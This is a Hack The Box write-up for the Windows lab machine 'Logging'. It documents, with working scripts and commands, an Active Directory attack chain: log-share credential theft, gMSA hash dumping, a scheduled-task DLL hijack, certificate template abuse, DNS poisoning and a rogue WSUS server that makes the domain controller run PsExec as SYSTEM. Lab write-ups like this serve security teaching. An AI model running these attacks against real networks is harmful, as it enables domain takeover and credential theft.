<div align="center">

# Logging — HackTheBox

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)


---

</div>

> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.

## Target Information

| Property | Value |
|----------|-------|
| Machine | Logging |
| IP | `<TARGET_IP>` |
| OS | Windows Server 2019 |
| Difficulty | Medium |
| Hostname | DC01.logging.htb |
| Domain | LOGGING.HTB |

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Attack Chain](#attack-chain)
3. [Initial Setup](#initial-setup)
4. [Recon](#recon)
5. [Credentials from the Logs Share](#credentials-from-the-logs-share)
6. [gMSA Abuse — Read `msa_health$` Hash](#gmsa-abuse--read-msa_health-hash)
7. [WinRM as `msa_health$`](#winrm-as-msa_health)
8. [DLL Hijack via Scheduled Task — User Flag](#dll-hijack-via-scheduled-task--user-flag)
9. [Enumerate the UpdateSrv Certificate Template](#enumerate-the-updatesrv-certificate-template)
10. [Mint a WSUS Server Certificate via the DLL](#mint-a-wsus-server-certificate-via-the-dll)
11. [Create a Machine Account and Poison DNS](#create-a-machine-account-and-poison-dns)
12. [Rogue WSUS Server with wsuks](#rogue-wsus-server-with-wsuks)
13. [Force Windows Update Detection](#force-windows-update-detection)
14. [Privilege Escalation to Local Administrator](#privilege-escalation-to-local-administrator)
15. [Root Flag](#root-flag)
16. [Key Takeaways](#key-takeaways)
17. [Flags](#flags)

---

## Executive Summary

`Logging` chains a plaintext credential leaked in a misconfigured log share, a Group Managed Service Account (gMSA) password read abuse, a DLL hijack inside a scheduled task that executes as a privileged user, a certificate template that lets the enrollee supply the subject, and finally a rogue WSUS server attack. The final payload is delivered as a Microsoft-signed PsExec binary pushed through a fake WSUS server that the Domain Controller trusts because we issued the server's TLS certificate from the internal CA. The update runs as `NT AUTHORITY\SYSTEM` and adds our gMSA to `BUILTIN\Administrators`, giving us a full admin shell on the DC.

---

## Attack Chain

```text
wallace.everette (Domain User, guest-read on \\DC01\Logs)
  -> IdentitySync_Trace log leaks svc_recovery password
    -> svc_recovery has GenericWrite on msa_health$ (gMSA)
      -> write msDS-GroupMSAMembership, read gMSA password blob
        -> NT hash for msa_health$
          -> WinRM as msa_health$
            -> place malicious Settings_Update.zip in C:\ProgramData\UpdateMonitor
              -> UpdateChecker Agent scheduled task loads settings_update.dll
                -> code execution as jaylee.clifton (IT group)
                  -> user.txt
                  -> submit CSR for wsus.logging.htb to UpdateSrv template (ENROLLEE_SUPPLIES_SUBJECT)
                    -> valid TLS certificate signed by logging-DC01-CA
                      -> SeMachineAccountPrivilege -> create attacker01$
                        -> AD-integrated DNS dynamic update -> wsus.logging.htb A record -> attacker
                          -> wsuks serves rogue HTTPS WSUS on 8531 with our TLS cert
                            -> DC downloads and executes PsExec64 as SYSTEM
                              -> net localgroup administrators msa_health$ /add
                                -> msa_health$ is now local admin on the DC
                                  -> read root.txt
```

---

## Initial Setup

### Add Hosts

```bash
sudo nano /etc/hosts
```

```
<TARGET_IP>  DC01.logging.htb logging.htb wsus.logging.htb
```

### Configure Kerberos (optional — useful for `svc_recovery`, which is in Protected Users so NTLM is blocked)

```bash
sudo nano /etc/krb5.conf
```

```ini
[libdefaults]
    default_realm = LOGGING.HTB
    dns_lookup_realm = false
    dns_lookup_kdc  = false
    ticket_lifetime = 24h
    forwardable = yes
    noaddresses = true

[realms]
    LOGGING.HTB = {
        kdc = <TARGET_IP>
        admin_server = <TARGET_IP>
    }

[domain_realm]
    .logging.htb = LOGGING.HTB
    logging.htb  = LOGGING.HTB
```

### Clock Sync

The DC clock is about 7 hours ahead of the VPN. Wrap every Kerberos operation with `faketime`:

```bash
faketime -f "+7h" <command>
```

Or query the DC clock via LDAP and compute the delta:

```bash
python3 -c "
import ldap3, datetime
s = ldap3.Server('<TARGET_IP>', get_info=ldap3.ALL)
c = ldap3.Connection(s, auto_bind=True)
print(s.info.other['currentTime'])
print('Local:', datetime.datetime.utcnow())
"
```

---

## Recon

```bash
nmap -Pn -p- --min-rate 2000 -T4 <TARGET_IP>
# 53/tcp   open  domain
# 80/tcp   open  http
# 88/tcp   open  kerberos-sec
# 135/tcp  open  msrpc
# 139/tcp  open  netbios-ssn
# 389/tcp  open  ldap
# 445/tcp  open  microsoft-ds
# 464/tcp  open  kpasswd5
# 593/tcp  open  http-rpc-epmap
# 636/tcp  open  ldapssl
# 3268/tcp open  globalcatLDAP
# 3269/tcp open  globalcatLDAPssl
# 5985/tcp open  wsman
# 8530/tcp open  http      (WSUS — HTTP)
# 8531/tcp open  http      (WSUS — HTTPS)
# 9389/tcp open  adws
```

Ports `8530/8531` are the telltale sign of **WSUS** running on the DC — the final escalation primitive.

SMB share enumeration with the provided starter credentials (`wallace.everette:Welcome2026@`):

```bash
nxc smb <TARGET_IP> -u wallace.everette -p 'Welcome2026@' --shares
```

```
Share     Permissions    Remark
ADMIN$                   Remote Admin
C$                       Default share
IPC$      READ           Remote IPC
Logs      READ
NETLOGON  READ           Logon server share
SYSVOL    READ           Logon server share
WSUSTemp                 WSUS Local Publishing share
```

The `Logs` share is readable by any authenticated user.

---

## Credentials from the Logs Share

```bash
smbclient //<TARGET_IP>/Logs -U 'logging.htb\wallace.everette%Welcome2026@' \
  -c 'prompt OFF; mget *'
```

```
Audit_Heartbeat.log
IdentitySync_Trace_20260219.log
Service_State.log
TaskMonitor.log
```

`IdentitySync_Trace_20260219.log` contains a plaintext LDAP bind dump:

```
ConnectionContext Dump: {
  Domain: "logging.htb",
  Server: "DC01",
  SSL: "False",
  BindUser: "LOGGING\svc_recovery",
  BindPass: "Em3rg3ncyPa$$2025"
}
```

> **Gotcha:** the password in the log has the year `2025`. The working password is the current year (`2026`). Password rotation policy rolled the value but the old trace was never redacted.

Validate (NTLM will fail — `svc_recovery` is in Protected Users — so use Kerberos):

```bash
faketime -f "+7h" impacket-getTGT 'logging.htb/svc_recovery:Em3rg3ncyPa$$2026' \
  -dc-ip <TARGET_IP>
```

```
[*] Saving ticket in svc_recovery.ccache
```

---

## gMSA Abuse — Read `msa_health$` Hash

### Discover the Edge in BloodHound

Collect with `svc_recovery` and open in BloodHound:

```bash
KRB5CCNAME=svc_recovery.ccache faketime -f "+7h" \
  bloodhound-python -u svc_recovery -k --no-pass -d logging.htb \
  -ns <TARGET_IP> --dc dc01.logging.htb --zip -c All
```

`svc_recovery` has an outbound `GenericWrite` edge onto the gMSA `MSA_HEALTH$`.

### Grant Ourselves Read Access to the Password

With `GenericWrite` on the gMSA we can overwrite `msDS-GroupMSAMembership` to include `wallace.everette`'s SID, then dump the gMSA NT hash.

```bash
KRB5CCNAME=svc_recovery.ccache faketime -f "+7h" \
  python3 /opt/gMSADumper/gMSADumper.py \
  -u svc_recovery -k --no-pass -d logging.htb -l dc01.logging.htb
```

If that fails, patch the attribute manually:

```python
# grant_gmsa_read.py
import ldap3
from impacket.ldap import ldaptypes

s = ldap3.Server('<TARGET_IP>')
c = ldap3.Connection(s, user='logging.htb\\svc_recovery',
                     password='Em3rg3ncyPa$$2026',
                     authentication=ldap3.NTLM, auto_bind=True)

sid = 'S-1-5-21-4020823815-2796529489-1682170552-1103'  # wallace.everette
sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
sd['Revision'] = b'\x01'
sd['Sbz1'] = b'\x00'
sd['Control'] = 32772
sd['OwnerSid'] = ldaptypes.LDAP_SID(); sd['OwnerSid'].fromCanonical('S-1-5-18')
sd['GroupSid'] = b''
sd['Sacl'] = b''
acl = ldaptypes.ACL(); acl['AclRevision'] = 4; acl['Sbz1'] = 0; acl['Sbz2'] = 0
ace = ldaptypes.ACE(); ace['AceType'] = 0; ace['AceFlags'] = 0
nace = ldaptypes.ACCESS_ALLOWED_ACE(); nace['Mask'] = ldaptypes.ACCESS_MASK()
nace['Mask']['Mask'] = 983551
nace['Sid'] = ldaptypes.LDAP_SID(); nace['Sid'].fromCanonical(sid)
ace['Ace'] = nace
acl.aces = [ace]; sd['Dacl'] = acl

c.modify('CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb',
         {'msDS-GroupMSAMembership': [(ldap3.MODIFY_REPLACE, [sd.getData()])]})
print(c.result)
```

Then dump:

```bash
python3 /opt/gMSADumper/gMSADumper.py -u wallace.everette -p 'Welcome2026@' \
  -d logging.htb -l dc01.logging.htb
```

```
msa_health$:::aad3b435b51404eeaad3b435b51404ee:603fc24ee01a9409f83c9d1d701485c5:::
```

---

## WinRM as `msa_health$`

`msa_health$` is a member of `BUILTIN\Remote Management Users`, so Pass-the-Hash over WinRM works.

```bash
evil-winrm -i <TARGET_IP> -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
```

Initial orientation:

```powershell
whoami /all
# BUILTIN\Remote Management Users, Certificate Service DCOM Access, Users
# SeMachineAccountPrivilege (Disabled by default, enabled when needed)

Get-ChildItem 'C:\Program Files\UpdateMonitor\' -Recurse
Get-ChildItem 'C:\ProgramData\UpdateMonitor\' -Recurse
Get-Content   'C:\ProgramData\UpdateMonitor\Logs\monitor.log' -Tail 20
```

The `monitor.log` reveals the mechanism: every 3 minutes the `UpdateChecker Agent` scheduled task runs `UpdateMonitor.exe`, which:

1. Looks for `C:\ProgramData\UpdateMonitor\Settings_Update.zip`
2. `File.Delete`s `C:\Program Files\UpdateMonitor\bin\settings_update.dll`
3. `ZipFile.ExtractToDirectory(zip, bin)`
4. `LoadLibrary(bin\settings_update.dll)`
5. `GetProcAddress(hDll, "PreUpdateCheck")` and calls it
6. `FreeLibrary`

Dump the task to confirm it runs as a different user:

```powershell
Get-Content 'C:\Windows\System32\Tasks\UpdateChecker Agent'
```

The task runs as `LOGGING\jaylee.clifton` with a stored password (`LogonType=Password`).

This is a classic **DLL hijack via a scheduled task that runs as a different user**. We control the input (zip) and therefore the DLL — execution happens as `jaylee.clifton`.

---

## DLL Hijack via Scheduled Task — User Flag

Pull down `UpdateMonitor.exe` and decompile to confirm the exact paths and loading logic:

```powershell
# evil-winrm
download 'C:\Program Files\UpdateMonitor\UpdateMonitor.exe' /tmp/UpdateMonitor.exe
```

```bash
ilspycmd /tmp/UpdateMonitor.exe
```

Key observations: the process is 32-bit (`Prefer 32-bit` .NET flag), so our DLL must also be 32-bit. `LoadLibrary` is called with the full path, so there's no DLL search-order trick — the extracted DLL is what gets loaded.

### Build a 32-bit DLL

```c
// cert_submit.c
// Compile: i686-w64-mingw32-gcc -shared -o settings_update.dll cert_submit.c -s
#include <windows.h>

__declspec(dllexport) void PreUpdateCheck(void) {
    system("cmd /c certreq -f -submit "
           "-attrib \"CertificateTemplate:UpdateSrv\" "
           "-config \"DC01.logging.htb\\logging-DC01-CA\" "
           "C:\\ProgramData\\UpdateMonitor\\req.csr "
           "C:\\ProgramData\\UpdateMonitor\\cert.cer "
           "> C:\\ProgramData\\UpdateMonitor\\submit_log.txt 2>&1 < NUL");
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {
    if (r == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h);
    return TRUE;
}
```

> **Two traps worth calling out explicitly** — both cost hours on the live box:
>
> 1. **Use `-f` on `certreq` and redirect stdin from `NUL`.** Without `-f`, `certreq` prompts to overwrite `cert.rsp`; without `< NUL`, any unexpected prompt blocks forever. A hung `PreUpdateCheck` never calls `FreeLibrary`, which keeps `settings_update.dll` locked on disk — every subsequent task trigger fails its `File.Delete`, you lose the ability to update the DLL, and you need a box reset.
> 2. **The DLL must be 32-bit.** A 64-bit DLL returns `LoadLibrary` error 193 (`ERROR_BAD_EXE_FORMAT`) because of the `Prefer 32-bit` flag on the .NET host.

### Package and upload

```bash
zip -j Settings_Update_cert.zip settings_update.dll
```

```powershell
# evil-winrm
upload Settings_Update_cert.zip C:\ProgramData\UpdateMonitor\Settings_Update.zip
```

Wait up to three minutes. `monitor.log` will confirm the load:

```
[2026-04-19 00:47:15] Calling 'PreUpdateCheck' in settings_update.dll
[2026-04-19 00:47:16] Update check completed.
```

### User Flag

The DLL runs as `jaylee.clifton` — she is the owner of `user.txt`. Add a second `system(...)` to the DLL to drop `user.txt` into the writable `Logs` share, or swap the command in `PreUpdateCheck` temporarily:

```c
system("cmd /c type C:\\Users\\jaylee.clifton\\Desktop\\user.txt "
       "> C:\\Share\\Logs\\user.txt");
```

```bash
smbget -U 'wallace.everette%Welcome2026@' smb://<TARGET_IP>/Logs/user.txt
cat user.txt
```

```
35e4190159d2d74a82e75ee9005d5510
```

---

## Enumerate the UpdateSrv Certificate Template

With `jaylee.clifton` effectively available through the DLL, the interesting pivot is ADCS. Enumerate templates with Certipy:

```bash
faketime -f "+7h" certipy-ad find \
  -u 'msa_health$@logging.htb' -hashes ':603fc24ee01a9409f83c9d1d701485c5' \
  -target DC01.logging.htb -dc-ip <TARGET_IP> \
  -stdout -enabled
```

The custom template `UpdateSrv` stands out:

```
Template Name                 : UpdateSrv
Schema Version                : 2
Client Authentication         : False
Enrollee Supplies Subject     : True
Extended Key Usage            : Server Authentication
Enrollment Rights             : LOGGING\IT
```

It's not directly exploitable via PKINIT (Server Authentication EKU only — Kerberos rejects it with `KDC_ERR_INCONSISTENT_KEY_PURPOSE`), but it's exactly what WSUS wants for its HTTPS certificate: a machine-auth cert whose SAN we control.

Only the `IT` group can enroll. `jaylee.clifton` is in `IT`, and we execute as her via the DLL.

---

## Mint a WSUS Server Certificate via the DLL

Build a CSR for `wsus.logging.htb` on the attacker (so we keep the private key):

```python
# build_wsus_csr.py
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

pk = rsa.generate_private_key(public_exponent=65537, key_size=2048)
open('wsus_key.pem', 'wb').write(pk.private_bytes(
    serialization.Encoding.PEM,
    serialization.PrivateFormat.TraditionalOpenSSL,
    serialization.NoEncryption()))

csr = (x509.CertificateSigningRequestBuilder()
       .subject_name(x509.Name([
           x509.NameAttribute(NameOID.COMMON_NAME, 'wsus.logging.htb')]))
       .add_extension(x509.SubjectAlternativeName([
           x509.DNSName('wsus.logging.htb'), x509.DNSName('wsus')]), critical=False)
       .sign(pk, hashes.SHA256()))
open('req.csr', 'wb').write(csr.public_bytes(serialization.Encoding.DER))
```

Upload `req.csr` next to the zip:

```powershell
# evil-winrm
upload req.csr C:\ProgramData\UpdateMonitor\req.csr
```

On the next 3-minute trigger the DLL submits the CSR to `UpdateSrv` as `jaylee.clifton`. The CA issues the certificate and `cert.cer` appears alongside `req.csr`. Pull it back and build a PFX:

```powershell
download C:\ProgramData\UpdateMonitor\cert.cer /tmp/wsus_cert.cer
```

```bash
openssl pkcs12 -export \
  -out wsus_srv.pfx \
  -inkey wsus_key.pem \
  -in   wsus_cert.cer \
  -passout pass:

openssl pkcs12 -in wsus_srv.pfx -out wsus_srv_cert.pem -clcerts -nokeys -passin pass:
openssl pkcs12 -in wsus_srv.pfx -out wsus_srv_key.pem  -nocerts  -nodes  -passin pass:

openssl x509 -in wsus_srv_cert.pem -noout -subject -ext subjectAltName
# subject=CN = wsus.logging.htb
# X509v3 Subject Alternative Name: DNS:wsus.logging.htb, DNS:wsus
```

We now hold a certificate for `wsus.logging.htb` signed by `logging-DC01-CA`, which the DC trusts.

---

## Create a Machine Account and Poison DNS

The DC is configured to fetch updates from `https://wsus.logging.htb:8531`, but no `wsus` record exists in the AD-integrated DNS zone. We need it to resolve to us.

`msa_health$` has `SeMachineAccountPrivilege`, which lets us add a new computer account (the `MachineAccountQuota` is 10 by default). Any authenticated computer can register records in the DNS zone via `dnsNode` create-child rights granted to Authenticated Users by default.

```bash
faketime -f "+7h" impacket-addcomputer \
  -computer-name 'attacker01$' -computer-pass 'SuperP@ss!' \
  -hashes ':603fc24ee01a9409f83c9d1d701485c5' \
  -dc-ip <TARGET_IP> \
  'logging.htb/msa_health$'
```

Insert the A record over LDAP in the MS-DNSP binary format:

```python
# add_dns.py
import ldap3, struct

ATTACKER_IP = '<YOUR_VPN_IP>'
ip = bytes(int(x) for x in ATTACKER_IP.split('.'))
# DNS_RPC_RECORD_A: DataLen(2) Type(2) Ver(1) Rank(1) Flags(2) Serial(4) Ttl(4) Reserved(4) TimeStamp(4) Data(4)
record = struct.pack('<HHBBHIIII', 4, 1, 5, 0xF0, 0, 1, 180, 0, 0) + ip

s = ldap3.Server('<TARGET_IP>', port=389)
c = ldap3.Connection(s, user='logging.htb\\attacker01$', password='SuperP@ss!',
                     authentication=ldap3.NTLM, auto_bind=True)
c.add('DC=wsus,DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb',
      ['top', 'dnsNode'],
      {'dnsRecord': [record], 'dnsTombstoned': 'FALSE'})
print(c.result)
```

Wait ~60 seconds for zone propagation, then confirm from the DC:

```powershell
# evil-winrm as msa_health$
ipconfig /flushdns
Resolve-DnsName wsus.logging.htb
# Name              Type  IPAddress
# wsus.logging.htb  A     <YOUR_VPN_IP>
```

---

## Rogue WSUS Server with wsuks

### Why wsuks and not pywsus

The obvious tool is `pywsus`, but against a Server 2019 DC it fails silently. Its `sync-updates.xml` advertises the update under a Windows product category the DC isn't a member of, so after `SyncUpdates` the client logs `"Windows Update Client successfully detected 0 updates."` and never calls `GetExtendedUpdateInfo`. `wsuks` ships a simpler `sync-updates.xml` without the prerequisite, and the DC follows through.

### Payload

```bash
# Microsoft-signed, required by WSUS for unattended install
wget https://live.sysinternals.com/tools/PsExec64.exe -O /tmp/PsExec64.exe
```

### Install wsuks and bypass its nftables dependency

`wsuks` refuses to run without `nftables`, but we don't need ARP spoofing because we already own DNS. Patch it out:

```bash
pip install --user wsuks
```

```python
# run_wsuks.py — serve-only mode on both 8530 (HTTP content) and 8531 (HTTPS WSUS)
import ssl, sys, os, logging, threading
from functools import partial
from http.server import HTTPServer

# Stub the ARP / nftables module before wsuks' server imports it
sys.modules['wsuks.lib.router'] = type(sys)('stub')
sys.modules['wsuks.lib.router'].Router = object

from wsuks.lib.logger import initLogger
initLogger(debug=False)
from wsuks.lib.wsusserver import WSUSUpdateHandler, WSUSBaseServer

HOST = '<YOUR_VPN_IP>'
EXE  = '/tmp/PsExec64.exe'

COMMAND = ('/accepteula /s cmd.exe /c "'
           'net localgroup administrators msa_health$ /add 2>&1 > C:\\Share\\Logs\\PWN.txt & '
           'net localgroup administrators >> C:\\Share\\Logs\\PWN.txt 2>&1 & '
           'icacls C:\\Share\\Logs\\PWN.txt /grant Everyone:F"')

exe_bytes = open(EXE, 'rb').read()
h = WSUSUpdateHandler(exe_bytes, os.path.basename(EXE), f'http://{HOST}:8530')
h.set_resources_xml(COMMAND)
log = logging.getLogger('wsuks')

def serve(port, use_tls):
    httpd = HTTPServer((HOST, port), partial(WSUSBaseServer, h))
    if use_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain('/tmp/wsus_srv_cert.pem', '/tmp/wsus_srv_key.pem')
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
        log.info(f'HTTPS WSUS on {HOST}:{port}')
    else:
        log.info(f'HTTP content on {HOST}:{port}')
    httpd.serve_forever()

threading.Thread(target=serve, args=(8530, False), daemon=True).start()
serve(8531, True)
```

```bash
python3 run_wsuks.py
# [*] HTTP content on <IP>:8530
# [*] HTTPS WSUS on <IP>:8531
```

---

## Force Windows Update Detection

From the evil-winrm session as `msa_health$`, reset the Windows Update data store and kick off a scan so the DC retrieves our metadata immediately instead of waiting for the scheduled 22-hour cycle:

```powershell
Stop-Service wuauserv -Force
Remove-Item 'C:\Windows\SoftwareDistribution' -Recurse -Force
Start-Service wuauserv
wuauclt /resetauthorization /detectnow
usoclient StartScan
```

`run_wsuks.py` shows the full WSUS handshake:

```
[+] POST /ClientWebService/client.asmx — GetConfig
[+] POST /ClientWebService/client.asmx — GetCookie
[+] POST /ClientWebService/client.asmx — SyncUpdates
[+] POST /ClientWebService/client.asmx — GetExtendedUpdateInfo
[+] GET  /<uuid>/PsExec64.exe
[+] GET  /<uuid>/PsExec64.exe
```

Two GETs is expected — the Windows Update agent does a ranged HEAD/download validation.

---

## Privilege Escalation to Local Administrator

A minute after the GETs, the DC runs `PsExec64 /accepteula /s cmd.exe /c "net localgroup administrators msa_health$ /add..."` as SYSTEM. Verify from our existing WinRM session:

```powershell
Get-Content C:\Share\Logs\PWN.txt
```

```
The command completed successfully.

Alias name     administrators
Members
-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
msa_health$
toby.brynleigh
The command completed successfully.
```

Re-authenticate over WinRM to pick up the new token with the admin group membership:

```bash
evil-winrm -i <TARGET_IP> -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
```

```powershell
whoami /groups | findstr /i admin
# BUILTIN\Administrators ... Enabled group, Group owner
```

---

## Root Flag

The root flag on this box is **not** on `Administrator\Desktop` — that directory only contains `desktop.ini`. The Domain Admin is `toby.brynleigh`; her Desktop holds `root.txt`:

```powershell
Get-ChildItem 'C:\Users\' -Recurse -Force -Filter '*.txt' -EA 0 |
  ForEach-Object { try {
      $c = Get-Content $_.FullName -TotalCount 1 -EA 0
      if ($c -match '^[a-f0-9]{32}$') { "$($_.FullName): $c" }
  } catch {} }
```

```
C:\Users\jaylee.clifton\Desktop\user.txt: 35e4190159d2d74a82█████████████████
C:\Users\toby.brynleigh\Desktop\root.txt: 36a0e1803d1a9ac3e1█████████████████
```

```powershell
type C:\Users\toby.brynleigh\Desktop\root.txt
```

Rooted.

---

## Key Takeaways

### Log Hygiene Is a Credential Store

An ADCS-enabled, hardened Active Directory environment still fell to a plaintext password in a readable file share. Old IdentitySync traces that look harmless contain bind credentials.

### gMSA Access Is a Transitive Privilege

`GenericWrite` on a gMSA is equivalent to holding its password — you can grant yourself read access on `msDS-GroupMSAMembership` and dump the NT hash whenever you want.

### Scheduled-Task DLL Hijacks Are a User-Impersonation Primitive

Any user that can write to the input directory of a scheduled task running as another principal effectively **executes as that principal**. On `Logging` the input was a zip file; the task unpacked it into `Program Files\...\bin\` and loaded the DLL.

### `UpdateSrv` + `ENROLLEE_SUPPLIES_SUBJECT` = WSUS-Server-Trust Anchor

The template is not a PKINIT primitive — Server Authentication EKU won't do Kerberos — but it is exactly the material needed to impersonate any HTTPS service the DC trusts, including its own WSUS endpoint.

### `SeMachineAccountPrivilege` + Default DNS ACLs = MITM Without ARP

Creating a computer account gives you a DNS writer. No ARP spoofing, no layer-2 access — a pure AD-level primitive.

### `pywsus` vs `wsuks` on Server 2019

`pywsus` advertises updates under a Windows product category the server OS isn't in, and the client drops the sync as "0 updates detected". `wsuks` uses a minimal `sync-updates.xml` without the prerequisite and the install proceeds. Verify by checking `C:\Windows\SoftwareDistribution\ReportingEvents.log` on the target for `[AGENT_DETECTION_FINISHED]` entries.

### Always Tame Subprocesses in Looping Tasks

Never spawn an interactive-prone binary (`certreq`, `net use`, `netsh`) from inside a DLL loaded by a repeating task without `-f`/`/y`/`/quiet` flags **and** `< NUL`. A single hung child will freeze the DLL load slot for the duration of the box.

---

## Flags

| Flag | Value |
|------|-------|
| User | `35e4190159d2d74a82█████████████████` |
| Root | `36a0e1803d1a9ac3e1█████████████████` |

---

<div align="center">

**Written by MrsNobody**

<img src="../assets/MrsNobody.png" width="80">

*Hack The Box — Logging*

</div>
